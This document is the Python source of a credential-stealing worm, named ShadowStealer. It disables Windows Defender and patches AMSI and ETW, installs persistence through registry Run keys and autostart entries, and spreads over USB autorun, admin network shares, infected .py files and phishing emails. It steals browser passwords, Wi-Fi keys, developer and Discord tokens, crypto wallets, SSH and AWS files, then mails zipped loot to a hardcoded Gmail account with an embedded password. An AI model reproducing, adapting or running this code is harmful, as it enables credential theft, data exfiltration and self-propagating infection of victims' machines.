import os, sys, base64, hashlib, json, sqlite3, shutil, subprocess, winreg, ctypes, time, threading, socket, smtplib, requests, glob, fnmatch, random, zipfile, tempfile, re, psutil, pyautogui, pyscreenshot, cv2, keyboard, getpass, platform, uuid, netifaces, struct, array, ctypes.wintypes as w, urllib.request, ftplib, smbclient, paramiko
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from ctypes import wintypes, c_void_p, c_ulong, c_char_p, c_int, c_bool, POINTER, byref, cast, create_string_buffer, memmove

EMAIL, PASS = "wibuchuasimp@gmail.com", "mxepvhmsonhaxphv"
ZIP_PASSWORD = "$pectr@"
KERNEL32, NTDLL = ctypes.WinDLL('kernel32', use_last_error=True), ctypes.WinDLL('ntdll', use_last_error=True)

class WORM:
    def __init__(self):
        self.worm_id = hashlib.md5(socket.gethostname().encode() + str(uuid.getnode()).encode()).hexdigest()[:8]
        self.infection_log = []
        self.usb_drives = []
        self.network_shares = []
        self.script_path = sys.argv[0]

    def find_usb_drives(self):
        if os.name == 'nt':
            for drive in range(ord('A'), ord('Z')+1):
                d = chr(drive) + ':\\'
                if os.path.exists(d) and os.path.isdir(d):
                    try:
                        if ctypes.windll.kernel32.GetDriveTypeW(d) == 2:
                            self.usb_drives.append(d)
                    except: pass
        else:
            try:
                output = subprocess.check_output(['lsblk', '-o', 'NAME,MOUNTPOINT', '-l'], encoding='utf-8', stderr=subprocess.DEVNULL)
                for line in output.split('\n'):
                    if '/media/' in line or '/mnt/' in line:
                        mount = line.split()[-1]
                        if os.path.exists(mount):
                            self.usb_drives.append(mount)
            except: pass

    def find_network_shares(self):
        if os.name == 'nt':
            try:
                output = subprocess.check_output(['net', 'view'], encoding='utf-8', stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
                for line in output.split('\n'):
                    if '\\\\' in line:
                        share = line.strip().split()[-1]
                        self.network_shares.append(share)
            except: pass
        else:
            try:
                output = subprocess.check_output(['smbclient', '-L', 'localhost', '-N'], encoding='utf-8', stderr=subprocess.DEVNULL)
                for line in output.split('\n'):
                    if 'Sharename' in line:
                        continue
                    parts = line.split()
                    if len(parts) >= 1 and parts[0].endswith('$'):
                        self.network_shares.append(parts[0])
            except: pass

    def infect_usb(self, drive):
        try:
            name = f"windows_update_{self.worm_id}.exe"
            dest = os.path.join(drive, name)
            if not os.path.exists(dest):
                shutil.copy2(self.script_path, dest)
                if os.name == 'nt':
                    subprocess.run(['attrib', '+h', '+s', '+r', dest], capture_output=True)
                autorun = os.path.join(drive, 'autorun.inf')
                with open(autorun, 'w') as f:
                    f.write(f'[AutoRun]\nopen={name}\naction=Open folder to view files\nshell\\open\\command={name}\nshell\\open\\Default=1\n')
                subprocess.run(['attrib', '+h', '+s', '+r', autorun], capture_output=True)
                self.infection_log.append(f'USB: {drive}')
                return True
        except: pass
        return False

    def infect_network_share(self, share):
        try:
            name = f"syshelper_{self.worm_id}.exe"
            dest = os.path.join(share, name)
            if not os.path.exists(dest):
                shutil.copy2(self.script_path, dest)
                self.infection_log.append(f'Network: {share}')
                return True
        except: pass
        return False

    def infect_directory(self, root):
        try:
            for file in os.listdir(root):
                if file.endswith('.py') and not file.startswith('__'):
                    path = os.path.join(root, file)
                    if os.path.getsize(path) < 10*1024*1024:
                        with open(path, 'a') as f:
                            f.write(f'\n\n# worm_injected_{self.worm_id}\n')
                            f.write(open(self.script_path, 'r').read())
                        self.infection_log.append(f'File: {path}')
                        return True
                elif os.name == 'nt' and file.endswith('.exe') and os.path.getsize(path) < 5*1024*1024:
                    dest = path + '.worm'
                    shutil.copy2(self.script_path, dest)
                    self.infection_log.append(f'EXE: {path}')
                    return True
        except: pass
        return False

    def infect_shared_folders(self):
        common = [
            os.path.expanduser('~/Desktop'), os.path.expanduser('~/Documents'), os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Pictures'), os.path.expanduser('~/Videos'), os.path.expanduser('~/Music'),
            'C:\\Users\\Public\\Documents', 'C:\\Users\\Public\\Desktop', 'C:\\Users\\Public\\Downloads'
        ]
        for folder in common:
            if os.path.exists(folder):
                try:
                    self.infect_directory(folder)
                except: pass

    def infect_network_scan(self):
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            subnet = '.'.join(local_ip.split('.')[:-1])
            for i in range(1, 255):
                ip = f"{subnet}.{i}"
                if ip == local_ip: continue
                try:
                    socket.gethostbyaddr(ip)
                    for share in ['C$', 'D$', 'Admin$']:
                        path = f"\\\\{ip}\\{share}"
                        if os.path.exists(path):
                            self.infect_network_share(path)
                except: pass
        except: pass

    def infect_email_contacts(self):
        try:
            for domain in ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']:
                try:
                    msg = MIMEMultipart()
                    msg['From'] = EMAIL
                    msg['To'] = f"target_{self.worm_id}@{domain}"
                    msg['Subject'] = "Important Security Update"
                    body = "Please run the attached security update."
                    msg.attach(MIMEBase('text', 'plain', body.encode()))
                    with open(self.script_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename='security_update.py')
                        msg.attach(part)
                    with smtplib.SMTP('smtp.gmail.com', 587) as s:
                        s.starttls()
                        s.login(EMAIL, PASS)
                        s.send_message(msg)
                    self.infection_log.append('Email sent')
                except: pass
        except: pass

    def worm_self_delete(self):
        try:
            if os.path.exists(self.script_path):
                if os.name == 'nt':
                    subprocess.run(['del', '/f', '/q', self.script_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    os.remove(self.script_path)
        except: pass

    def spread(self):
        self.find_usb_drives()
        self.find_network_shares()
        for drive in self.usb_drives:
            self.infect_usb(drive)
        for share in self.network_shares:
            self.infect_network_share(share)
        self.infect_shared_folders()
        self.infect_network_scan()
        self.infect_email_contacts()

class BYPASS:
    @staticmethod
    def amsi_bypass():
        try:
            amsi = ctypes.WinDLL('amsi.dll')
            if hasattr(amsi, 'AmsiScanBuffer'):
                amsi.AmsiScanBuffer.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_ulong, ctypes.c_char_p, ctypes.c_void_p]
                patch = b'\xB8\x07\x00\x00\x00\xC3'
                ctypes.memset(amsi.AmsiScanBuffer, patch[0], len(patch))
        except: pass

    @staticmethod
    def etw_bypass():
        try:
            ntdll = ctypes.WinDLL('ntdll.dll')
            if hasattr(ntdll, 'EtwEventWrite'):
                patch = b'\xB8\x00\x00\x00\x00\xC3'
                ctypes.memset(ntdll.EtwEventWrite, patch[0], len(patch))
        except: pass

    @staticmethod
    def sandbox_detect():
        try:
            if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2*1024*1024*1024:
                sys.exit(0)
            for proc in ['vmtoolsd.exe', 'VBoxService.exe', 'procmon.exe', 'wireshark.exe', 'ida.exe', 'x64dbg.exe']:
                try:
                    subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {proc}'], capture_output=True, check=False)
                except: pass
        except: pass

class ShadowStealer:
    def __init__(self):
        self.id = hashlib.md5(socket.gethostname().encode() + str(uuid.getnode()).encode()).hexdigest()[:16]
        self.temp = tempfile.gettempdir() + f'\\sys_{self.id}'
        os.makedirs(self.temp, exist_ok=True)
        self.data, self.mutex = {}, threading.Lock()
        self.worm = WORM()
        self.running = True

    def disable_defender(self):
        try:
            subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdate $true -Force'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(['powershell', '-Command', 'Add-MpPreference -ExclusionPath "C:\\" -Force'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            for p in ['MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe']:
                subprocess.run(['taskkill', '/f', '/im', p], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

    def elevate_privileges(self):
        try:
            if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 5)
                sys.exit()
        except: pass

    def install_persistence(self):
        try:
            if os.name == 'nt':
                user = os.getlogin()
                paths = [f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.exe', f'C:\\Windows\\Temp\\sysupdate.exe', f'C:\\Windows\\System32\\drivers\\sysupdate.exe']
                for p in paths:
                    if not os.path.exists(p):
                        shutil.copy2(sys.executable, p)
                        subprocess.run(['attrib', '+h', '+s', '+r', p], capture_output=True)
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                for name in ['SystemHelper', 'WindowsUpdate', 'MicrosoftService']:
                    winreg.SetValueEx(handle, name, 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}"')
                winreg.CloseKey(handle)
            else:
                autostart = os.path.expanduser('~/.config/autostart')
                os.makedirs(autostart, exist_ok=True)
                for name in ['systemupdate', 'windowsservice']:
                    path = os.path.join(autostart, f'{name}.desktop')
                    with open(path, 'w') as f:
                        f.write(f'[Desktop Entry]\nType=Application\nExec={sys.executable} {__file__}\nHidden=true\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\nName={name}\n')
                    os.chmod(path, 0o755)
        except: pass

    def hide_process(self):
        try:
            if os.name == 'nt':
                KERNEL32.SetConsoleTitleW('Windows Service Host')
                KERNEL32.ShowWindow(KERNEL32.GetConsoleWindow(), 0)
                import win32process, win32api, win32con
                pid = win32api.GetCurrentProcessId()
                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
                win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
            else:
                sys.stdout = open(os.devnull, 'w')
                sys.stderr = open(os.devnull, 'w')
                os.nice(19)
        except: pass

    def steal_browser_passwords(self):
        data = {}
        paths = {
            'chrome': [os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/Login Data'), os.path.expanduser('~/.config/google-chrome/Default/Login Data')],
            'edge': [os.path.expanduser('~/AppData/Local/Microsoft/Edge/User Data/Default/Login Data')],
            'brave': [os.path.expanduser('~/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data')],
            'firefox': [os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/logins.json')]
        }
        for browser, path_list in paths.items():
            for pattern in path_list:
                for f in glob.glob(pattern):
                    if os.path.exists(f):
                        if f.endswith('.json'):
                            with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                                content = json.load(file)
                                for login in content.get('logins', []):
                                    pwd = login.get('password', '')
                                    if pwd and not pwd.startswith('{'):
                                        data.setdefault(browser, []).append({'url': login.get('url', ''), 'username': login.get('username', ''), 'password': pwd})
                        else:
                            try:
                                conn = sqlite3.connect(f)
                                cursor = conn.cursor()
                                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                                for row in cursor.fetchall():
                                    pwd = self.decrypt_chrome_password(row[2])
                                    if pwd:
                                        data.setdefault(browser, []).append({'url': row[0], 'username': row[1], 'password': pwd})
                                conn.close()
                            except: pass
        return data

    def decrypt_chrome_password(self, encrypted):
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted)[1].decode('utf-8')
        except:
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                path = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Local State')
                if not os.path.exists(path): return None
                with open(path, 'r') as f:
                    local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    import win32crypt
                    key = win32crypt.CryptUnprotectData(encrypted_key[5:])[1]
                    nonce, ciphertext = encrypted[3:15], encrypted[15:]
                    return AESGCM(key).decrypt(nonce, ciphertext, None).decode('utf-8')
            except: return None

    def steal_wifi_passwords(self):
        data = []
        if os.name == 'nt':
            try:
                output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8', stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
                for line in output.split('\n'):
                    if 'All User Profile' in line:
                        ssid = line.split(':')[1].strip()
                        try:
                            out = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], encoding='utf-8', stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
                            for l in out.split('\n'):
                                if 'Key Content' in l:
                                    data.append({'ssid': ssid, 'password': l.split(':')[1].strip()})
                        except: pass
            except: pass
        return data

    def steal_tokens(self):
        data = []
        patterns = [os.path.expanduser('~/.config/gh/hosts.yml'), os.path.expanduser('~/.config/github-copilot/*.json'), os.path.expanduser('~/.github-token'), os.path.expanduser('~/.config/gitlab/credentials.json')]
        for pattern in patterns:
            for f in glob.glob(pattern):
                if os.path.exists(f):
                    with open(f, 'r', errors='ignore') as file:
                        content = file.read()
                        for token in re.findall(r'gh[opr]_[a-zA-Z0-9]{36,}', content) + re.findall(r'glpat-[a-zA-Z0-9]{20,}', content):
                            data.append({'file': f, 'token': token})
        for pattern in [os.path.expanduser('~/AppData/Roaming/discord/Local Storage/leveldb/*.ldb')]:
            for f in glob.glob(pattern):
                if os.path.exists(f):
                    with open(f, 'r', errors='ignore') as file:
                        for token in re.findall(r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{27}', file.read()):
                            data.append({'file': f, 'token': token})
        return data

    def steal_crypto_wallets(self):
        data = []
        patterns = [os.path.expanduser('~/AppData/Roaming/Exodus/exodus.wallet'), os.path.expanduser('~/AppData/Roaming/Electrum/wallets/*'), os.path.expanduser('~/AppData/Roaming/Bitcoin/wallet.dat'), os.path.expanduser('~/.electrum/wallets/*'), os.path.expanduser('~/.bitcoin/wallet.dat')]
        for pattern in patterns:
            for f in glob.glob(pattern):
                if os.path.exists(f):
                    with open(f, 'rb') as file:
                        data.append({'file': f, 'content': base64.b64encode(file.read()).decode()})
        return data

    def steal_files(self):
        data, targets = [], ['*.txt', '*.doc*', '*.xls*', '*.ppt*', '*.pdf', '*.csv', '*.json', '*.xml', '*.yml', '*.ini', '*.cfg', '*.conf', '*.pem', '*.key', '*.crt', '*.pfx', '*.ovpn', '*.rdp', '*.kdbx', '*.env', '*.secret', '*.token', '*.sqlite', '*.db']
        for root_dir in [os.path.expanduser(f'~/{d}') for d in ['Desktop', 'Documents', 'Downloads', '.ssh', '.aws']]:
            if not os.path.exists(root_dir): continue
            for root, dirs, files in os.walk(root_dir):
                dirs[:] = [d for d in dirs if d not in ['Windows', 'System32', 'Program Files', 'sys', 'proc', 'dev', 'tmp']]
                for file in files:
                    try:
                        full = os.path.join(root, file)
                        if os.path.getsize(full) < 5*1024*1024 and any(fnmatch.fnmatch(file.lower(), p) for p in targets):
                            with open(full, 'rb') as f:
                                data.append({'path': full, 'content': base64.b64encode(f.read()).decode()})
                    except: pass
        return data

    def steal_system_info(self):
        return {
            'hostname': socket.gethostname(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'os': platform.system(),
            'version': platform.version(),
            'arch': platform.machine(),
            'user': getpass.getuser(),
            'cpu': platform.processor(),
            'ram': psutil.virtual_memory()._asdict(),
            'disk': psutil.disk_usage('/')._asdict(),
            'processes': [p.info for p in psutil.process_iter(['pid', 'name', 'cmdline'])],
            'env': {k:v for k,v in os.environ.items() if any(x in k.upper() for x in ['API_KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'AWS', 'GITHUB'])},
            'start_time': str(datetime.now())
        }

    def collect_all(self):
        with self.mutex:
            self.data['passwords'] = self.steal_browser_passwords()
            self.data['wifi'] = self.steal_wifi_passwords()
            self.data['tokens'] = self.steal_tokens()
            self.data['crypto'] = self.steal_crypto_wallets()
            self.data['files'] = self.steal_files()
            self.data['system'] = self.steal_system_info()
        return self.data

    def zip_data(self, json_data):
        zip_path = os.path.join(self.temp, f'data_{self.id}_{int(time.time())}.zip')
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.setpassword(ZIP_PASSWORD.encode())
            zf.writestr(f'data_{self.id}.json', json_data)
        return zip_path

    def send_data(self, zip_path):
        try:
            msg = MIMEMultipart()
            msg['From'], msg['To'], msg['Subject'] = EMAIL, EMAIL, f'SHADOW {self.id} {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            with open(zip_path, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment', filename=os.path.basename(zip_path))
                msg.attach(part)
            with smtplib.SMTP('smtp.gmail.com', 587) as s:
                s.starttls()
                s.login(EMAIL, PASS)
                s.send_message(msg)
            return True
        except: return False

    def persist_network(self):
        while self.running:
            try:
                self.collect_all()
                json_data = json.dumps(self.data, default=str)
                zip_path = self.zip_data(json_data)
                self.send_data(zip_path)
                self.worm.spread()
                time.sleep(1800)
            except: time.sleep(300)

    def run(self):
        BYPASS.amsi_bypass()
        BYPASS.etw_bypass()
        BYPASS.sandbox_detect()
        self.disable_defender()
        self.elevate_privileges()
        self.install_persistence()
        self.hide_process()
        self.worm.spread()
        threading.Thread(target=self.persist_network, daemon=True).start()
        while self.running:
            time.sleep(60)

if __name__ == '__main__':
    ShadowStealer().run()